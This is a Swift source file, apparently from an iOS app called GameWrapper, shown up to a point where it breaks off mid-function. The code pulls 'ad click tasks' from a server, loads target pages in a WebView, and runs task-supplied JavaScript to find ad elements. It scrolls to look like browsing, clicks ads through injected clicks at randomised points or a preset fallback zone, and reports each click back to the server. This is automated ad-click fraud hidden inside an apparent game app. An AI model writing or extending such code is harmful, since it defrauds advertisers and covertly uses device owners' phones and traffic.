//
//  SingleLayerViewModel.swift
//  GameWrapper
//
//  Created by arvin on 2025/6/15.
//

import Foundation
import SwiftUI
import Combine
import WebKit

/// 单层 WebView 容器的 ViewModel
internal class SingleLayerViewModel: ObservableObject {
    
    // MARK: - 共享实例
    /// 共享实例，用于在不同视图之间共享状态
    static let shared = SingleLayerViewModel()
    
    // MARK: - Published 属性
    /// 当前状态
    @Published var state: SingleLayerInteraction.State = .initial
    /// 当前任务
    @Published var currentTask: LinkTask?
    // 容器状态
    private var isContainerDismissed: Bool = false
    
    // 广告检测状态
    @Published var detectedAds: [AdElement] = []
    @Published var bestMatchedAd: AdElement?
    @Published var unityScreenshot: UIImage?
    
    // 截图状态管理
    private var isCapturingScreenshot: Bool = false
    /// WebView 是否已加载
    @Published var isWebViewLoaded: Bool = false
    /// 层级是否已切换
    @Published var isLayerSwitched: Bool = false
    /// 是否显示广告指示器
    @Published var showAdIndicator: Bool = false
    /// 是否已加载二级页面（广告点击后的跳转页面）
    @Published var isSecondaryPageLoaded: Bool = false
    /// 任务是否已完成
    private var isTaskCompleted: Bool = false
    
    // MARK: - 私有属性
    /// 交互模式
    private var interactionMode: SingleLayerInteraction.Mode = .adClickOnly
    /// 任务仓库
    private let taskRepository = TaskRepository.shared
    /// 层级管理器
    private let layerManager = GameWrapperLayerManager.shared
    /// WebView 协调器
    private var webViewCoordinator: WebViewCoordinator?
    /// 滑动交互器
    private var scrollInteractor: WebViewScrollInteractor?
    /// iframe广告点击处理器
    private var iframeAdClickHandler: IframeAdClickHandler?
    /// 取消订阅集合
    private var cancellables = Set<AnyCancellable>()
    /// 滑动计时器
    private var scrollTimer: Timer?
    /// 滑动开始时间
    private var scrollStartTime: Date?
    /// 滑动结束时间
    private var scrollEndTime: Date?
    /// 滑动距离
    private var scrollDistance: CGFloat = 0
    /// 滑动方向 (true: 向上, false: 向下)
    private var scrollDirectionUp: Bool = true
    /// 重试滑动次数
    private var retryScrollCount: Int = 0
    /// 最大重试滑动次数
    private let maxRetryScrollCount: Int = 2  // 增加重试次数，支持滚动到广告位置后重新检测
    /// 初始化配置
    private var initConfig: InitConfig? {
        return taskRepository.initConfig
    }
    /// JS 配置
    private var jsConfig: JSConfig? {
        return taskRepository.jsConfig
    }
    
    // MARK: - Unity截图管理器
    /// Unity截图管理器
    private let screenshotManager = UnityScreenshotManager.shared
    
    
    // MARK: - 初始化
    init() {
        print("[H5] [SingleLayerVM] 初始化 SingleLayerViewModel 实例")
        setupObservers()
    }
    
    // MARK: - 公共方法
    /// 开始任务处理流程
    func startTaskProcess() {
        print("[H5] [SingleLayerVM] 当前任务状态 state：\(state)")
        guard state == .initial else {
            print("[H5] [SingleLayerVM] ⚠️ 当前状态不是 initial，无法开始新任务")
            return
        }
        
        // 获取下一个可用的广告点击任务
        guard let task = taskRepository.getNextAvailableAdClickTask() else {
            print("[H5] [SingleLayerVM] ⚠️ 没有可用的广告点击任务")
            state = .initial
            return
        }
        
        currentTask = task
        print("[H5] [SingleLayerVM] 🚀 开始任务处理: \(task.taskDescription), \(task.nextAdGap)")
        
        // 重置重试计数
        retryScrollCount = 0
        print("[H5] [SingleLayerVM] 🔄 重置重试计数: \(retryScrollCount)")
        
        // 确定交互模式
        determineInteractionMode(for: task)
        
        // 如果已有WebView协调器，重新设置回调
        if webViewCoordinator != nil {
            setupWebViewCallbacks()
        }
        
        // 添加日志，跟踪任务开始时的状态
        print("[H5] [SingleLayerVM] 📊 任务开始时状态: isWebViewLoaded=\(isWebViewLoaded), webViewCoordinator=\(webViewCoordinator != nil ? "有效" : "无效")")
    }
    
    /// 处理 WebView 加载完成
    func handleWebViewLoaded(_ coordinator: WebViewCoordinator) {
        // 检查是否是当前任务的WebView回调
        guard currentTask != nil, !isTaskFinished() else {
            print("[H5] [SingleLayerVM] ⚠️ 收到已完成/失败任务的WebView回调，忽略")
            return
        }
        
        // 防止重复加载
        if isWebViewLoaded && webViewCoordinator === coordinator {
            print("[H5] [SingleLayerVM] ⚠️ WebView已经加载过，忽略重复加载")
            return
        }
        
        webViewCoordinator = coordinator
        isWebViewLoaded = true
        
        // 初始化滑动交互器
        if let webView = coordinator.webView {
            // 保持对旧的滑动交互器的引用，确保它不会被立即释放
            let oldInteractor = scrollInteractor
            // 创建新的滑动交互器
            scrollInteractor = WebViewScrollInteractor.forSingleLayerWebView(webView)
            // 延迟释放旧的交互器，确保新的交互器已经完全初始化
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) {
                _ = oldInteractor // 防止编译器警告
            }
        }
        
        // 初始化iframe广告点击处理器
        iframeAdClickHandler = IframeAdClickHandler(webViewCoordinator: coordinator)
        
        // 检查是否是二级页面加载完成
        if isSecondaryPageLoaded {
            print("[H5] [SingleLayerVM] ✅ 二级页面加载完成，不进行广告检测")
            // 已经处于二级页面状态，不需要进一步处理
            return
        }
        
        state = .loaded
        
        print("[H5] [SingleLayerVM] ✅ WebView 加载完成")
        
        // 如果WebView仍在加载或内容尺寸无效，延迟执行后续操作
        if coordinator.webView?.scrollView.contentSize.height == 0 {
            print("[H5] [SingleLayerVM] ⚠️ WebView 仍在加载或内容尺寸无效，延迟执行后续操作")
            
            // 设置一个检查计时器，每0.5秒检查一次WebView状态
            let checkTimer = Timer.scheduledTimer(withTimeInterval: 0.5, repeats: true) { [weak self, weak coordinator] timer in
                guard let self = self, let coordinator = coordinator, let webView = coordinator.webView else {
                    print("[H5] [SingleLayerVM] ❌ WebView或协调器已被释放，取消检查")
                    timer.invalidate()
                    return
                }
                
                // 检查任务是否仍然有效
                guard self.currentTask != nil, !self.isTaskFinished() else {
                    print("[H5] [SingleLayerVM] ⚠️ 任务已完成或失败，停止WebView检查")
                    timer.invalidate()
                    return
                }
                
                // 检查WebView是否仍在加载
                if webView.scrollView.contentSize.height > 0 {
                    print("[H5] [SingleLayerVM] ✅ WebView 加载完全完成，内容尺寸有效")
                    timer.invalidate()
                    
                    // 再次记录状态
                    print("[H5] [SingleLayerVM] 📊 WebView 最终状态: contentSize=\(webView.scrollView.contentSize), frame=\(webView.frame)")
                    
                    // 根据交互模式决定下一步操作
                    DispatchQueue.main.async {
                        switch self.interactionMode {
                        case .adClickOnly:
                            // 直接检测广告
                            let time = self.currentTask?.startClick ?? 0
                            DispatchQueue.mainAsyncAfter(TimeInterval(time)) {
                                self.detectAds()
                            }
                        case .scrollThenAdClick:
                            // 开始滑动
                            self.startScrolling()
                        }
                    }
                } else {
                    print("[H5] [SingleLayerVM] ⏳ WebView 内容尺寸无效: contentSize=\(webView.scrollView.contentSize)")
                }
            }
            
            // 设置10秒超时，防止无限等待
            DispatchQueue.main.asyncAfter(deadline: .now() + 10.0) {
                if checkTimer.isValid {
                    print("[H5] [SingleLayerVM] ⚠️ WebView 加载检查超时，强制继续")
                    checkTimer.invalidate()
                    
                    // 强制继续执行
                    DispatchQueue.main.async { [weak self] in
                        guard let self = self, self.currentTask != nil, !self.isTaskFinished() else {
                            return
                        }
                        
                        switch self.interactionMode {
                        case .adClickOnly:
                            let time = self.currentTask?.startClick ?? 0
                            DispatchQueue.mainAsyncAfter(TimeInterval(time)) {
                                self.detectAds()
                            }
                        case .scrollThenAdClick:
                            self.startScrolling()
                        }
                    }
                }
            }
        } else {
            // WebView已完全加载，直接执行后续操作
            print("[H5] [SingleLayerVM] WebView已完全加载，直接执行后续操作")
            switch interactionMode {
            case .adClickOnly:
                // 直接检测广告
                print("[H5] [SingleLayerVM] 直接检测广告")
                let time = self.currentTask?.startClick ?? 0
                DispatchQueue.mainAsyncAfter(TimeInterval(time)) {
                    self.detectAds()
                }
            case .scrollThenAdClick:
                // 开始滑动
                print("[H5] [SingleLayerVM] 开始滑动")
                startScrolling()
            }
        }
    }
    
    /// 处理 WebView 加载失败
    func handleWebViewLoadFailed(_ error: Error) {
        // 检查是否是当前任务的WebView回调
        guard currentTask != nil, !isTaskFinished() else {
            print("[H5] [SingleLayerVM] ⚠️ 收到已完成/失败任务的WebView失败回调，忽略")
            return
        }
        
        print("[H5] [SingleLayerVM] ❌ WebView 加载失败: \(error.localizedDescription)")
        state = .failed(NSError(domain: "SingleLayerViewModel", code: 404, userInfo: [NSLocalizedDescriptionKey: "WebView 加载失败"]))
    }
    
    /// 处理跨域广告点击后的iframe加载
    func handleAdIframeLoaded(_ coordinator: WebViewCoordinator) {
        print("[H5] [SingleLayerVM] \(#function) 🍀🍀🍀🍀🍀🍀🍀🍀🍀🍀🍀🍀🍀🍀🍀")
        // 检查是否是当前任务的WebView回调
        guard currentTask != nil, !isTaskFinished() else {
            print("[H5] [SingleLayerVM] ⚠️ 收到已完成/失败任务的广告点击回调，忽略")
            return
        }
        
        print("[H5] [SingleLayerVM] 🔄 检测到广告点击，准备进入二级页面交互")
        
        // 如果已经在二级页面状态，不重复处理
        if isSecondaryPageLoaded {
            print("[H5] [SingleLayerVM] ℹ️ 已经在二级页面状态，忽略重复的iframe加载")
            return
        }
        
        // 标记已加载二级页面
        isSecondaryPageLoaded = true
        print("[H5] [SingleLayerVM] ✅ 标记为二级页面状态")
        
        // 取消广告指示器显示
        showAdIndicator = false
        
        // 开始二级页面的滑动交互
        startSecondaryPageInteraction()
    }
    
    /// 开始二级页面的交互（滑动但不检测广告）
    private func startSecondaryPageInteraction() {
        print("[H5] [SingleLayerVM] 🔄 开始二级页面交互")
        
        // 延迟一段时间等待二级页面完全加载
        DispatchQueue.main.asyncAfter(deadline: .now() + 3.5) { [weak self] in
            guard let self = self else { return }
            
            // 检查是否还在二级页面状态且WebView有效
            guard self.isSecondaryPageLoaded, self.isWebViewValid() else {
                print("[H5] [SingleLayerVM] ⚠️ 二级页面状态已改变或WebView无效，取消交互")
                return
            }
            
            // 在二级页面进行滑动，但不检测广告
            self.performScrolling(type: .secondaryPageInteraction) { [weak self] in
                guard let self = self else { return }
                print("[H5] [SingleLayerVM] ✅ 二级页面滑动交互完成")
                // 二级页面交互完成，标记任务为成功
                self.tryFinishCurrentTask(isSuccess: true, reason: "二级页面交互完成")
                self.cleanupUIState()
            }
        }
    }
    
    // MARK: - Container Lifecycle
    
    /// 容器出现
    func handleContainerAppear() {
        isContainerDismissed = false
        print("[H5] [SingleLayerVM] 📱 容器出现")
    }
    
    /// 容器消失
    func handleContainerDisappear() {
        // 检查当前状态，判断是否是真正的消失还是临时的层级切换
        if case .completed = state {
            print("[H5] [SingleLayerVM] 📱 任务已完成，容器真正消失")
            isContainerDismissed = true
            cleanupUIState()
        } else if case .failed = state {
            print("[H5] [SingleLayerVM] 📱 任务已失败，容器真正消失")
            isContainerDismissed = true
            cleanupUIState()
        } else if isLayerSwitched {
            print("[H5] [SingleLayerVM] 📱 层级切换导致容器暂时消失，保持状态")
        } else {
            print("[H5] [SingleLayerVM] 📱 容器消失，标记状态")
            isContainerDismissed = true
        }
    }
    
    /// 检查容器是否可用
    private func isContainerValid() -> Bool {
        return !isContainerDismissed
    }
    
    // MARK: - 私有方法
    /// 设置观察者
    private func setupObservers() {
        // 监听状态变化
        $state
            .dropFirst()
            .sink { [weak self] state in
                print("[H5] [SingleLayerVM] 状态变化: \(state)")
                self?.handleStateChange(state)
            }
            .store(in: &cancellables)
        
        // 监听检测到的广告
        $detectedAds
            .dropFirst()
            .filter { !$0.isEmpty }
            .sink { [weak self] ads in
                print("[H5] [SingleLayerVM] 检测到 \(ads.count) 个广告元素")
                self?.matchBestAd(from: ads, isLastDetection: false)
            }
            .store(in: &cancellables)
        
        // 监听最佳匹配广告
        $bestMatchedAd
            .dropFirst()
            .compactMap { $0 }
            .sink { [weak self] ad in
                print("[H5] [SingleLayerVM] 找到最佳匹配广告: \(ad.type.rawValue), ID: \(ad.id)")
                self?.showAdIndicator = true
            }
            .store(in: &cancellables)
        
        // 监听层级管理器的顶层类型变化
        layerManager.$topLayerType
            .dropFirst()
            .sink { [weak self] layerType in
                self?.handleLayerChange(layerType)
            }
            .store(in: &cancellables)
        
        // 监听点击广告后进入二级页面
        $isSecondaryPageLoaded
            .sink { [weak self] isSecondary in
                guard isSecondary else { return }
                print("[H5] [SingleLayerVM] 🔄 检测到从WebView切换回Unity，进入二级页面，上报任务")
                if let ad = self?.bestMatchedAd, let task = self?.currentTask {
                    let json = H5UploadParam.clickParam(ad, link: task.link)
                    NetworkServer.uploadH5Params(json)
                }
            }
            .store(in: &cancellables)
        
        // 监听广告展示状态变化
        //        Task { @MainActor in
        //            AdDisplayManager.shared.$isShowingAd
        //                .dropFirst()
        //                .sink { [weak self] isShowingAd in
        //                    print("[H5] [SingleLayerVM] 📱 广告展示状态变化: \(isShowingAd ? "展示中" : "已关闭")")
        //                    // 如果广告关闭且当前有待检测的状态，可以考虑重新触发检测
        //                    if !isShowingAd {
        //                        self?.handleAdDisplayStatusChanged()
        //                    }
        //                }
        //                .store(in: &self.cancellables)
        //        }
    }
    
    /// 处理广告展示状态变化
    private func handleAdDisplayStatusChanged() {
        // 如果有当前任务且不在检测状态，可以考虑重新检测
        guard let task = currentTask else {
            print("[H5] [SingleLayerVM] ⚠️ 没有当前任务，无法处理广告展示状态变化")
            return
        }
        
        // 如果任务没有指定 ID 和类型，不需要重新检测
        if task.id == nil && task.adType == nil {
            print("[H5] [SingleLayerVM] 📌 任务未指定 ID 和类型，不需要重新检测")
            return
        }
        
        // 只有在特定状态下才考虑重新触发检测
        switch state {
        case .loaded, .retryScrolling, .scrolling:
            print("[H5] [SingleLayerVM] 📱 广告已关闭，当前状态(\(String(describing: state)))允许重新检测")
            // 如果正在滚动，先等待滚动停止
            if case .scrolling = state {
                print("[H5] [SingleLayerVM] 🔄 等待当前滚动完成后再检测")
                DispatchQueue.main.asyncAfter(deadline: .now() + 2) { [weak self] in
                    guard let self = self else { return }
                    self.detectAds()
                }
            } else {
                // 对于已加载或停止滚动的状态，直接检测
                print("[H5] [SingleLayerVM] 🔍 直接开始重新检测")
                detectAds()
            }
        case .detecting:
            print("[H5] [SingleLayerVM] 📱 广告已关闭，但当前正在检测中，不重新检测")
            break
        case .completed, .failed:
            print("[H5] [SingleLayerVM] 📱 广告已关闭，但任务已完成或失败，不重新检测")
            break
        default:
            print("[H5] [SingleLayerVM] 📱 广告已关闭，但当前状态不适合重新检测: \(state)")
            break
        }
    }
    
    /// 处理层级类型变化
    private func handleLayerChange(_ layerType: LayerType) {
        print("[H5] [SingleLayerVM] 📱 层级类型变化: \(layerType)")
        
        // 如果从WebView切换回Unity，说明弹窗被关闭，用户点击了广告
        if layerType == .unity && isLayerSwitched && !isSecondaryPageLoaded {
            //print("[H5] [SingleLayerVM] 🔄 检测到从WebView切换回Unity，但未进入二级页面，直接完成任务")
            // 直接点击了弹窗但没有触发二级页面，直接完成任务
            //tryFinishCurrentTask(isSuccess: true, reason: "WebView切换回Unity且未进入二级页面")
            // 清理UI状态
            //cleanupUIState()
        }
    }
    
    /// 清理UI状态
    private func cleanupUIState() {
        // 取消所有延迟执行的操作
        DispatchQueue.main.async { [weak self] in
            guard let self = self else { return }
            
            // 清理状态
            self.detectedAds = []
            self.bestMatchedAd = nil
            //self.unityScreenshot = nil
            self.isCapturingScreenshot = false
            self.retryScrollCount = 0
            self.scrollStartTime = nil
            self.scrollEndTime = nil
            self.isLayerSwitched = false
            self.isWebViewLoaded = false
            self.isTaskCompleted = false
            self.isSecondaryPageLoaded = false
            self.showAdIndicator = false
            
            if let coordinator = webViewCoordinator {
                coordinator.resetNavigationState()
            }
            
            // 重置状态为 initial
            if case .failed = self.state {
                self.state = .initial
            } else if case .completed = self.state {
                self.state = .initial
            }
        }
    }
    
    /// 处理状态变化
    private func handleStateChange(_ state: SingleLayerInteraction.State) {
        switch state {
        case .loaded:
            // WebView 已加载，根据交互模式决定下一步
            break
        case .retryScrolling:
            // 重试滑动中，等待滑动完成后再次检测广告
            print("[H5] [SingleLayerVM] 🔄 状态变为重试滑动，等待滑动完成后再次检测广告")
            break
        case .completed:
            // 任务完成状态已在 finishCurrentTask 中处理
            print("[H5] [SingleLayerVM] ✅ 任务已标记为完成")
            break
        case .failed(let error):
            // 任务失败，调用失败处理逻辑
            print("[H5] [SingleLayerVM] ❌ 任务失败: \(error.localizedDescription)")
            finishCurrentTask(isSuccess: false)
        default:
            break
        }
    }
    
    /// 确定交互模式
    private func determineInteractionMode(for task: LinkTask) {
        switch task.type {
        case .aClick:
            interactionMode = .adClickOnly
            print("[H5] [SingleLayerVM] 📝 交互模式: 仅广告点击")
        case .mAClick:
            interactionMode = .scrollThenAdClick
            print("[H5] [SingleLayerVM] 📝 交互模式: 滑动后广告点击")
        default:
            interactionMode = .adClickOnly
            print("[H5] [SingleLayerVM] ⚠️ 未知任务类型，默认使用: 仅广告点击")
        }
    }
    
    /// 检测广告
    private func detectAds() {
        print("[H5] [SingleLayerVM] 🔍 开始检测广告元素 (第\(retryScrollCount + 1)次)")
        
        // 检查容器是否已消失
        guard isContainerValid() else {
            print("[H5] [SingleLayerVM] ⚠️ WebView容器已消失，取消广告检测")
            return
        }
        
        Task { @MainActor in
            // 在主线程上继续执行检测逻辑
            await performAdDetection()
        }
        
        // 检查是否有广告正在展示，如果有则延迟检测
        //        Task { @MainActor in
        //            if AdDisplayManager.shared.isShowingAd {
        //                print("[H5] [SingleLayerVM] 📱 有广告正在展示，延迟 10 秒后重新检测")
        //                DispatchQueue.main.asyncAfter(deadline: .now() + 10.0) { [weak self] in
        //                    self?.detectAds()
        //                }
        //                return
        //            }
        //
        //            // 在主线程上继续执行检测逻辑
        //            await self.performAdDetection()
        //        }
    }
    
    /// 执行广告检测的具体逻辑
    @MainActor
    private func performAdDetection() async {
        guard let task = currentTask else {
            print("[H5] [SingleLayerVM] ⚠️ 任务不可用，跳过广告检测")
            state = .failed(NSError(domain: "SingleLayerViewModel", code: 500, userInfo: [NSLocalizedDescriptionKey: "任务不可用"]))
            return
        }
        
        guard let webViewCoordinator = webViewCoordinator, isWebViewValid() else {
            print("[H5] [SingleLayerVM] ⚠️ WebView 协调器不可用或WebView已失效，跳过广告检测")
            state = .failed(NSError(domain: "SingleLayerViewModel", code: 500, userInfo: [NSLocalizedDescriptionKey: "WebView 不可用"]))
            return
        }
        
        print("[H5] [SingleLayerVM] ✅ 广告展示状态检查通过，开始执行广告检测")
        state = .detecting
        
        // 清除之前的广告检测结果
        detectedAds = []
        bestMatchedAd = nil
        
        // 保存当前任务ID，用于验证回调时任务是否仍然有效
        let currentTaskId = task.id ?? ""
        
        // 设置检测超时
        let detectionTimeout = DispatchWorkItem { [weak self] in
            guard let self = self, self.state == .detecting, (self.currentTask?.id ?? "") == currentTaskId else { return }
            self.state = .failed(NSError(domain: "SingleLayerViewModel", code: 408, userInfo: [NSLocalizedDescriptionKey: "广告检测超时"]))
            print("[H5] [SingleLayerVM] ⚠️ 广告检测超时")
        }
        
        // 5秒后如果检测还未完成，触发超时
        DispatchQueue.main.asyncAfter(deadline: .now() + 5.0, execute: detectionTimeout)
        
        // 执行广告检测 JS
        webViewCoordinator.runJavaScript(task.adJs) { [weak self] result in
            // 确保在主线程上执行回调
            DispatchQueue.main.async { [weak self] in
                guard let self = self else { return }
                
                // 取消超时
                detectionTimeout.cancel()
                
                // 检查任务和状态是否仍然有效
                guard (self.currentTask?.id ?? "") == currentTaskId, self.state == .detecting, self.isWebViewValid() else {
                    print("[H5] [SingleLayerVM] ❌ 广告检测结果返回时任务已变更或WebView已无效")
                    return
                }
                
                switch result {
                case .success(let jsonString):
                    print("[H5] [SingleLayerVM] ✅ 广告检测完成")
                    self.parseAdDetectionResult(jsonString, isLastDetection: false)
                    
                    // 添加日志，确认广告检测完成后WebView状态
                    print("[H5] [SingleLayerVM] 📊 广告检测后WebView状态: isWebViewValid=\(self.isWebViewValid()), coordinator=\(self.webViewCoordinator != nil ? "有效" : "无效")")
                    
                    // 如果已经找到最佳匹配的广告，则开始截图并切换层级
                    if self.bestMatchedAd != nil {
                        // 延迟一段时间再进行截图和层级切换，确保WebView交互完全完成
                        DispatchQueue.main.asyncAfter(deadline: .now() + 1.0) { [weak self] in
                            guard let self = self,
                                  self.currentTask?.id == currentTaskId,
                                  self.isWebViewValid() else {
                                print("[H5] [SingleLayerVM] ⚠️ 延迟后任务已变更或WebView已无效，取消截图和层级切换")
                                return
                            }
                            self.switchLayers()
                        }
                    }
                    
                case .failure(let error):
                    print("[H5] [SingleLayerVM] ❌ 广告检测失败: \(error.localizedDescription)")
                    self.state = .failed(error)
                }
            }
        }
    }
    
    /// 检查WebView是否仍然有效
    private func isWebViewValid() -> Bool {
        guard let coordinator = webViewCoordinator, let webView = coordinator.webView else {
            print("[H5] [SingleLayerVM] ⚠️ WebView或协调器已被释放")
            return false
        }
        
        // 检查WebView是否已添加到视图层次结构中
        // 注意：由于我们现在使用UIViewControllerRepresentable并保持WebView的强引用，
        // WebView可能暂时不在视图层次结构中但仍然有效
        if webView.superview == nil {
            print("[H5] [SingleLayerVM] ⚠️ WebView暂时不在视图层次结构中，但可能仍然有效")
            // 这里不返回false，因为WebView可能仍然有效
        }
        
        // 检查WebView尺寸是否有效
        if webView.frame.size.width <= 0 || webView.frame.size.height <= 0 {
            print("[H5] [SingleLayerVM] ⚠️ WebView尺寸无效: \(webView.frame.size)")
            // 尺寸可能暂时无效，但WebView可能仍然有效
        }
        
        // 检查WebView是否已被销毁（通过检查其window属性）
        if webView.window == nil && webView.superview == nil {
            print("[H5] [SingleLayerVM] ⚠️ WebView可能已被销毁，无window且无superview")
            return false
        }
        
        return true
    }
    
    /// 解析广告检测结果
    private func parseAdDetectionResult(_ result: Any, isLastDetection: Bool) {
        print("[H5] [SingleLayerVM] 广告检测结果字符串：\(result)")
        guard let jsonString = result as? String else {
            print("[H5] [SingleLayerVM] ❌ 广告检测结果不是有效的 JSON 字符串")
            state = .failed(NSError(domain: "SingleLayerViewModel", code: 400, userInfo: [NSLocalizedDescriptionKey: "无效的广告数据"]))
            return
        }
        if let elements = [AdElement].deserialize(from: jsonString) {
            print("[H5] [SingleLayerVM] ✅ 成功解析广告元素: \(elements.count) 个")
            print("[H5] [SingleLayerVM] 📌 当前任务：\(currentTask?.taskDescription ?? "无")")
            
            // 设置检测到的广告，让 Combine 监听器处理匹配逻辑
            detectedAds = elements
            
            if elements.isEmpty {
                print("[H5] [SingleLayerVM] ⚠️ 未检测到广告元素")
                handleNoAdsDetected(isLastDetection: isLastDetection)
            }
        } else {
            print("[H5] [SingleLayerVM] ❌ 解析广告元素失败")
            handleNoAdsDetected(isLastDetection: isLastDetection)
        }
    }
    
    /// 处理未检测到广告的情况
    private func handleNoAdsDetected(isLastDetection: Bool = false) {
        guard let task = currentTask else { return }
        
        print("[H5] [SingleLayerVM] 🔍 处理未检测到广告的情况 - \(isLastDetection ? "最后一次检测，将使用兜底方案" : "尝试继续检测")")
        
        // 检查是否有兜底区域
        if let zone = task.area, !zone.isEmpty {
            print("[H5] [SingleLayerVM] 使用兜底区域: \(zone)")
            
            // 获取WebView尺寸
            guard let webView = webViewCoordinator?.webView else {
                print("[H5] [SingleLayerVM] ❌ WebView不可用，无法解析兜底区域")
                state = .failed(NSError(domain: "SingleLayerViewModel", code: 404, userInfo: [NSLocalizedDescriptionKey: "未找到广告元素"]))
                return
            }
            
            // 先滚动到顶部
            print("[H5] [SingleLayerVM] 🔄 使用兜底区域前，先滚动到顶部")
            scrollToTop { [weak self] in
                guard let self = self else { return }
                
                // 获取屏幕尺寸
                let screenSize = webView.frame.size
                print("[H5] [SingleLayerVM] 📊 屏幕尺寸: \(screenSize)")
                
                // 尝试解析百分比格式的兜底区域
                if let adArea = PercentageAreaParser.parseArea(from: zone, screenSize: screenSize) {
                    print("[H5] [SingleLayerVM] ✅ 成功解析百分比兜底区域: \(adArea.rect)")
                    
                    // 创建兜底广告元素
                    var fallbackAd = AdElement()
                    fallbackAd.area = adArea
                    fallbackAd.visible = true
                    fallbackAd.source = "FallbackZone"
                    fallbackAd.type = .unknown
                    fallbackAd.loadStatus = .done
                    fallbackAd.fillStatus = .filled
                    fallbackAd.displayStatus = .visible
                    
                    bestMatchedAd = fallbackAd
                    switchLayers()
                    return
                }
                
                print("[H5] [SingleLayerVM] ❌ 无法解析兜底区域: \(zone)")
                self.state = .failed(NSError(domain: "SingleLayerViewModel", code: 404, userInfo: [NSLocalizedDescriptionKey: "无法解析兜底区域"]))
            }
        } else {
            print("[H5] [SingleLayerVM] ⚠️ 未检测到广告且无有效兜底区域")
            state = .failed(NSError(domain: "SingleLayerViewModel", code: 404, userInfo: [NSLocalizedDescriptionKey: "未找到广告元素"]))
        }
    }
    
    /// 滚动到顶部
    private func scrollToTop(completion: @escaping () -> Void) {
        guard let webView = webViewCoordinator?.webView else {
            print("[H5] [SingleLayerVM] ⚠️ WebView不可用，无法滚动到顶部")
            completion()
            return
        }
        
        print("[H5] [SingleLayerVM] 🔄 开始滚动到顶部")
        
        // 使用动画滚动到顶部
        let topOffset = CGPoint(x: 0, y: -22)
        webView.scrollView.setContentOffset(topOffset, animated: true)
        
        // 等待滚动动画完成
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) {
            print("[H5] [SingleLayerVM] ✅ 已滚动到顶部")
            completion()
        }
    }
    
    /// 匹配最佳广告
    private func matchBestAd(from ads: [AdElement], isLastDetection: Bool) {
        guard let task = currentTask else { return }
        
        // 打印当前任务的匹配条件
        print("[H5] [SingleLayerVM] 📌 当前任务匹配条件: ID=\(task.id ?? "无"), 类型=\(task.adType ?? "无")")
        print("[H5] [SingleLayerVM] 📊 当前检测状态: 第\(retryScrollCount + 1)次检测，最大\(maxRetryScrollCount)次")
        
        // 如果完全没有广告元素
        if ads.isEmpty {
            print("[H5] [SingleLayerVM] ⚠️ 未检测到任何广告元素")
            handleNoAdsDetected(isLastDetection: isLastDetection)
            return
        }
        
        // 分离可点击广告和所有广告
        let clickableAds = ads.filter { $0.isClickable }
        let allAds = ads
        
        print("[H5] [SingleLayerVM] 📊 检测到 \(allAds.count) 个广告元素，其中 \(clickableAds.count) 个可点击")
        
        // 添加详细的广告信息日志
        for (index, ad) in allAds.enumerated() {
            print("[H5] [SingleLayerVM] 📊 广告\(index): 类型=\(ad.type.rawValue), ID=\(ad.id), 可见=\(ad.visible), 可点击=\(ad.isClickable), 位置=\(ad.area?.top ?? 0)")
        }
        
        // 如果完全没有可点击的广告
        if clickableAds.isEmpty {
            print("[H5] [SingleLayerVM] ⚠️ 未找到任何可点击的广告")
            handleNoClickableAds(ads: allAds, isLastDetection: isLastDetection)
            return
        }
        
        // 执行广告匹配逻辑 - 传入所有广告，包括不可点击的
        let matchResult = findBestMatchingAd(from: clickableAds, allAds: allAds, task: task)
        
        switch matchResult {
        case .found(let ad):
            // 找到了合适的广告
            print("[H5] [SingleLayerVM] ✅ 找到合适的广告: \(ad.id), 类型: \(ad.type.rawValue)")
            reportAdDetectionResult(isSuccess: true, ads: allAds)
            bestMatchedAd = ad
            switchLayers()
            
        case .foundButInvisible(let ad):
            // 找到了匹配的广告但不可见，需要滚动
            print("[H5] [SingleLayerVM] 🔍 匹配结果: foundButInvisible - 广告类型: \(ad.type.rawValue), ID: \(ad.id), 可见性: \(ad.visible), 重试次数: \(retryScrollCount)/\(maxRetryScrollCount)")
            if retryScrollCount <= maxRetryScrollCount {
                print("[H5] [SingleLayerVM] 🔄 找到匹配广告但不可见，尝试滚动到广告位置")
                // 只在最后一次检测时上报，重试过程中不上报
                if retryScrollCount == maxRetryScrollCount {
                    reportAdDetectionResult(isSuccess: true, ads: allAds)
                }
                scrollToAd(ad)
            } else {
                print("[H5] [SingleLayerVM] ⚠️ 已达到最大重试次数，使用兜底区域")
                reportAdDetectionResult(isSuccess: false, ads: allAds)
                handleNoAdsDetected(isLastDetection: true)
            }
            
        case .notFound:
            print("[H5] [SingleLayerVM] 🔍 匹配结果: notFound")
            // 未找到匹配的广告
            if task.id == nil && task.adType == nil {
                // 任务未指定匹配条件，使用第一个可见可点击的广告
                let visibleClickableAds = clickableAds.filter { $0.visible }
                if let firstVisibleAd = visibleClickableAds.first {
                    print("[H5] [SingleLayerVM] ℹ️ 任务未指定匹配条件，使用第一个可见可点击广告")
                    reportAdDetectionResult(isSuccess: true, ads: allAds)
                    bestMatchedAd = firstVisibleAd
                    switchLayers()
                } else {
                    print("[H5] [SingleLayerVM] ⚠️ 任务未指定匹配条件，且没有可见可点击广告，使用兜底区域")
                    reportAdDetectionResult(isSuccess: false, ads: allAds)
                    handleNoAdsDetected(isLastDetection: true)
                }
            } else {
                // 任务指定了匹配条件但未找到，使用兜底区域
                print("[H5] [SingleLayerVM] 📌 未找到任何匹配的广告，使用兜底区域")
                reportAdDetectionResult(isSuccess: false, ads: allAds)
                handleNoAdsDetected(isLastDetection: true)
            }
        }
    }
    
    private func clickHandle(ad: AdElement) {
        guard let initConfig = initConfig else { return }
        let randomRate = Double.random(in: 0...1)
        print("[H5] [JS] [SingleLayerVM] randomRate: \(randomRate), initConfig.jsClickRt: \(initConfig.jsClickRt)")
        
        if randomRate < initConfig.jsClickRt { // 使用 js 注入点击
            let clickPoint = ad.area?.randomPoint ?? .zero
            print("[H5] [JS] [SingleLayerVM] 使用iframe广告点击处理器")
            
            iframeAdClickHandler?.handleIframeAdClick(ad: ad, clickPoint: clickPoint, jsConfig: jsConfig) { [weak self] result in
                guard let self = self else { return }
                
                switch result {
                case .success(let successType):
                    switch successType {
                    case .directLoad(let url):
                        print("[H5] [JS] [SingleLayerVM] 直接加载广告落地页: \(url)")
                        self.webViewCoordinator?.webView?.load(URLRequest(url: url))
                        print("[H5] [JS] [SingleLayerVM] 开始加载广告落地页~")
                        self.bestMatchedAd = ad
                        self.setupClickAdTime()
                        DispatchQueue.mainAsyncAfter(2) {
                            self.showAdIndicator = false
                        }
                        
                    case .useNativePopup:
